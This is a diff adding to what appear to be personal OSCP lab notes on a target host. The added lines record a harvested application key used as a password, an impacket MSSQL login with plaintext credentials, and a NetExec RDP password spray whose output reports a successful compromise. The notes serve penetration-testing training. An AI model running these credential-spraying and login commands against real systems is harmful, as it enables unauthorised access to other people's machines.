@@ -198,4 +198,18 @@ Recycle bin
 (note "USE FOR NEW DB"):welcome1
 
 impacket-mssqlclient 'emma':'SomersetVinyl1!'@192.168.156.248 -windows-auth -p 49965
+
+```
+
+Found environment variable:
+```
+AppKey:!8@aBRBYdb3!
+```
+
+```
+┌─[root@edu-virtualbox]─[/home/edu/OSCP/relia/248]
+└──╼ #nxc rdp 192.168.156.248 -u mark -p smb_passwords
+RDP         192.168.156.248 3389   EXTERNAL         [*] Windows 10 or Windows Server 2016 Build 20348 (name:EXTERNAL) (domain:EXTERNAL) (nla:True)
+RDP         192.168.156.248 3389   EXTERNAL         [+] EXTERNAL\mark:!8@aBRBYdb3! (Pwn3d!)
+
 ```
